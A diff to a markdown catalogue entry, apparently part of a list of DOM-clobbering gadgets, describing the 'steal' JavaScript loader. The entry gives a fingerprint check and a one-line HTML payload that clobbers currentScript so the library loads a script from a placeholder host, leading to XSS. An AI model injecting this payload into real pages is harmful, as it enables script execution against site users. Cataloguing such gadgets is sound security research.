@@ -4,13 +4,13 @@
 
 + Library: steal
 + Stars: 1.4K
-+ Version: 2.3.0
++ Version: v2.3.0
 + Fingerprint: `typeof window.steal !== 'undefined' && typeof window.steal.loader === 'object'`
 + Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx">```
 + Impact: XSS
 + CVE: N/A
 + Foundby: TheHulk
-
++ TheThing: None
 
 ### Library
 
